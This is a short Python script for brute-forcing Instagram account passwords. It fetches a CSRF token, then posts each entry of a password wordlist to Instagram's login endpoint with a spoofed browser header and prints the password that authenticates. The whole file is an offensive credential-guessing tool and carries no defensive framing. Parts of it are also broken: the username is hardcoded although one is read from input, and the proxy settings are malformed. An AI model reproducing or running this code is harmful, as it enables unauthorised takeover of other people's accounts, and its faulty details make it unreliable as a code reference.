from datetime import datetime
import requests
import json

username_user = input("username: ")

password_list = input("name password list: ")
file = open("password.txt")
file_read = file.read().splitlines()
number = 0
number2 = 0
link = 'https://www.instagram.com/accounts/login/'
login_url = 'https://www.instagram.com/accounts/login/ajax/'
right_password = []
proxies = {
    'proxies' : '185.171.231.115'
}

time = int(datetime.now().timestamp())
response = requests.get(link)
csrf = response.cookies['csrftoken']



while len(file_read) > number:
    i = 0
    test = file_read[number].split()
    payload = {
        'username': 'krompompom',
        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time}:{test[i]}',
        'queryParams': {},
        'optIntoOneTap': 'false'
    }
    #print(test[number2])
    i += 1

    number = number + 1
    number2 += +1

    login_header = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.35",
        "X-Requested-With": "XMLHttpRequest",
        "Referer": "https://www.instagram.com/accounts/login/",
        "x-csrftoken": csrf
    }

    login_response = requests.post(login_url, data=payload, headers=login_header, proxies=0 )
    json_data = json.loads(login_response.text)


    #["authenticated"]

    if json_data["authenticated"]:

        print("login successful \n")
        print("---------------")
        print(f"{username_user} password -> {test}")
        break
        #cookies = login_response.cookies
        #cookie_jar = cookies.get_dict()
        #csrf_token = cookie_jar['csrftoken']
        #print("csrf_token: ", csrf_token)
        #session_id = cookie_jar['sessionid']
        #print("session_id: ", session_id)

    else:
        print("login failed ", login_response.text)